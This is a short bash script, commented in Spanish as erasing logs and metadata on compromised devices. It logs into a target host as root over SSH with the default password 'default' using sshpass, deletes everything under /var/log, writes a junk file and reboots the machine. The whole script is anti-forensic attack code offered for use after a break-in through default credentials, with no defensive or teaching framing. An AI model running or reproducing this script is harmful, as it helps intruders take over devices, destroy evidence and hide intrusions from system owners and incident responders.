#!/bin/bash
# Borra logs y metadatos en dispositivos comprometidos
sshpass -p "default" ssh root@$1 << EOF
rm -f /var/log/*
dd if=/dev/zero of=/tmp/junk bs=1M count=100
reboot
EOF
